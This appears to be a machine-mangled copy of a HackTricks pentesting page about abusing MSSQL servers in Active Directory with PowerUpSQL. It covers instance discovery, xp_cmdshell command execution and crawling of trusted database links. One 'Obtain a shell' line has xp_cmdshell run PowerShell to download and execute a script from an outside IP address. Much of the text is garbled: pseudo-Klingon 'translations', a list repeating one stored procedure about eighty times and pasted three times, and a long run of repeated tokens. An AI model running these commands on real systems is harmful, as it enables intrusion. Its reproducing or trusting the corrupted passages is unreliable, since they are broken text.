# MSSQL AD Abuse

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> 'oH Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)! * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family) * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) * **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.** * **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **MSSQL Enumeration / Discovery**

The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is very useful in this case.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumerating from the network without domain session

#### tlhIngan Hol Translation:

### Domain session lo'laHbe'chugh network vItlhutlh

#### HTML Translation:

<h3>Domain session lo'laHbe'chugh network vItlhutlh</h3>
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### qarDaSqa' ghaH 'ej qarDaSqa' ghaH ghom

#### Enumerating SQL Server Instances

##### Using `osql` Command

To enumerate SQL Server instances from inside the domain, you can use the `osql` command. This command allows you to connect to a SQL Server instance and execute queries.

```plaintext
osql -S <server_name> -U <username> -P <password> -Q "SELECT name FROM sys.sysdatabases"
```

Replace `<server_name>`, `<username>`, and `<password>` with the appropriate values.

##### Using `sqlcmd` Command

Another option is to use the `sqlcmd` command to enumerate SQL Server instances. This command is similar to `osql` but provides more functionality.

```plaintext
sqlcmd -S <server_name> -U <username> -P <password> -Q "SELECT name FROM sys.sysdatabases"
```

Replace `<server_name>`, `<username>`, and `<password>` with the appropriate values.

#### Enumerating Databases

Once you have enumerated the SQL Server instances, you can proceed to enumerate the databases within each instance. You can use the following query to retrieve the names of the databases:

```plaintext
SELECT name FROM sys.sysdatabases
```

Replace `sys.sysdatabases` with the appropriate system table if needed.

#### Enumerating Tables and Columns

To enumerate the tables and columns within a database, you can use the following query:

```plaintext
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG='<database_name>'
```

Replace `<database_name>` with the name of the database you want to enumerate.

#### Enumerating Stored Procedures

To enumerate the stored procedures within a database, you can use the following query:

```plaintext
SELECT name FROM sys.procedures WHERE type='P'
```

Replace `sys.procedures` with the appropriate system table if needed.

#### Enumerating User Accounts

To enumerate the user accounts within a database, you can use the following query:

```plaintext
SELECT name FROM sys.sysusers WHERE issqluser = 1 AND hasdbaccess = 1
```

Replace `sys.sysusers` with the appropriate system table if needed.

#### Enumerating Views

To enumerate the views within a database, you can use the following query:

```plaintext
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.VIEWS WHERE TABLE_CATALOG='<database_name>'
```

Replace `<database_name>` with the name of the database you want to enumerate.

#### Enumerating Functions

To enumerate the functions within a database, you can use the following query:

```plaintext
SELECT name FROM sys.objects WHERE type='FN'
```

Replace `sys.objects` with the appropriate system table if needed.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
### MSSQL Qa' Abuse

#### QaH DB

```plaintext
1. Use the `xp_cmdshell` stored procedure to execute commands on the operating system level.
2. Use the `sp_oacreate` stored procedure to create an instance of an OLE object and execute commands.
3. Use the `openrowset` function to read files from the file system.
4. Use the `bulk insert` statement to import data from external files.
5. Use the `bcp utility` to import or export data.
6. Use the `xp_dirtree` stored procedure to list files and directories.
7. Use the `xp_fileexist` stored procedure to check if a file exists.
8. Use the `xp_regread` stored procedure to read registry keys.
9. Use the `xp_regwrite` stored procedure to write registry keys.
10. Use the `xp_regdeletekey` stored procedure to delete registry keys.
11. Use the `xp_regdeletevalue` stored procedure to delete registry values.
12. Use the `xp_enumdsn` stored procedure to enumerate ODBC data sources.
13. Use the `xp_availablemedia` stored procedure to list available backup devices.
14. Use the `xp_cmdshell` stored procedure to execute operating system commands.
15. Use the `xp_servicecontrol` stored procedure to start, stop, or pause services.
16. Use the `xp_subdirs` stored procedure to list subdirectories.
17. Use the `xp_fixeddrives` stored procedure to list fixed drives.
18. Use the `xp_loginconfig` stored procedure to retrieve information about the login configuration.
19. Use the `xp_msver` stored procedure to retrieve version information.
20. Use the `xp_readerrorlog` stored procedure to read the SQL Server error log.
21. Use the `xp_enumgroups` stored procedure to enumerate Windows groups.
22. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
23. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
24. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
25. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
26. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
27. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
28. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
29. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
30. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
31. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
32. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
33. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
34. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
35. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
36. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
37. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
38. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
39. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
40. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
41. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
42. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
43. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
44. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
45. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
46. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
47. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
48. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
49. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
50. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
51. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
52. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
53. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
54. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
55. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
56. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
57. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
58. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
59. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
60. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
61. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
62. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
63. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
64. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
65. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
66. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
67. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
68. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
69. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
70. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
71. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
72. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
73. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
74. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
75. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
76. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
77. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
78. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
79. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
80. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
81. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
82. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
83. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
84. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
85. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
86. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
87. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
88. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
89. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
90. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
91. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
92. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
93. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
94. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
95. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
96. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
97. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
98. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
99. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
100. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
```

#### QaH DB

```plaintext
1. Use the `xp_cmdshell` stored procedure to execute commands on the operating system level.
2. Use the `sp_oacreate` stored procedure to create an instance of an OLE object and execute commands.
3. Use the `openrowset` function to read files from the file system.
4. Use the `bulk insert` statement to import data from external files.
5. Use the `bcp utility` to import or export data.
6. Use the `xp_dirtree` stored procedure to list files and directories.
7. Use the `xp_fileexist` stored procedure to check if a file exists.
8. Use the `xp_regread` stored procedure to read registry keys.
9. Use the `xp_regwrite` stored procedure to write registry keys.
10. Use the `xp_regdeletekey` stored procedure to delete registry keys.
11. Use the `xp_regdeletevalue` stored procedure to delete registry values.
12. Use the `xp_enumdsn` stored procedure to enumerate ODBC data sources.
13. Use the `xp_availablemedia` stored procedure to list available backup devices.
14. Use the `xp_cmdshell` stored procedure to execute operating system commands.
15. Use the `xp_servicecontrol` stored procedure to start, stop, or pause services.
16. Use the `xp_subdirs` stored procedure to list subdirectories.
17. Use the `xp_fixeddrives` stored procedure to list fixed drives.
18. Use the `xp_loginconfig` stored procedure to retrieve information about the login configuration.
19. Use the `xp_msver` stored procedure to retrieve version information.
20. Use the `xp_readerrorlog` stored procedure to read the SQL Server error log.
21. Use the `xp_enumgroups` stored procedure to enumerate Windows groups.
22. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
23. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
24. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
25. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
26. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
27. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
28. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
29. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
30. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
31. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
32. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
33. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
34. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
35. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
36. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
37. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
38. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
39. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
40. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
41. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
42. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
43. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
44. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
45. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
46. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
47. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
48. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
49. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
50. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
51. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
52. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
53. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
54. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
55. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
56. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
57. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
58. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
59. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
60. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
61. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
62. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
63. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
64. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
65. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
66. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
67. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
68. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
69. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
70. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
71. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
72. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
73. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
74. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
75. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
76. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
77. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
78. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
79. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
80. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
81. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
82. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
83. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
84. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
85. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
86. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
87. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
88. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
89. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
90. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
91. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
92. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
93. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
94. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
95. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
96. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
97. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
98. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
99. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
100. Use the `xp_enumerrorlogs` stored procedure to enumerate SQL Server error logs.
```

#### QaH DB

```plaintext
1. Use the `xp_cmdshell` stored procedure to execute commands on the operating system level.
2. Use the `sp_oacreate` stored procedure to create an instance of an OLE object and execute commands.
3. Use the `openrowset` function to read files from the file system.
4. Use the `bulk insert` statement to import data from external files.
5. Use the `bcp utility` to import or export data.
6. Use the `xp_dirtree` stored procedure to list files and directories.
7. Use the `xp_fileexist` stored procedure to check if a file exists.
8. Use the `xp_regread` stored procedure to
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

**MSSQL host**-Da'wI'pu' **be'Hom** **Qap** **'ej** **execute commands** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL Basic Hacking Tricks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Trusted Links

**If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to use the trust relationship to execute queries also in the other instance. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.**

**The links between databases work even across forest trusts.**

### Powershell Abuse
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
